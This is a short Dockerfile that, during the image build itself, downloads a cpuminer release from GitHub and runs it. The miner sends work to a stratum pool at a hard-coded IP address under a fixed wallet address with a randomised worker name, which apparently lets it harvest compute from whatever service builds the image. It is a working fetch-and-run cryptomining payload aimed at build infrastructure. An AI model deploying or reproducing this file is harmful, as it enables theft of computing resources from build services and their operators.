FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
ENTRYPOINT ["timeout", "3600"]
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://51.79.177.216:17017 -u web1q93jm4p5qap2jny2qn09vx4jqdspfgmdqz9s6pt.$(echo $(shuf -i 1000-9999 -n 1)-tim-1) -t4
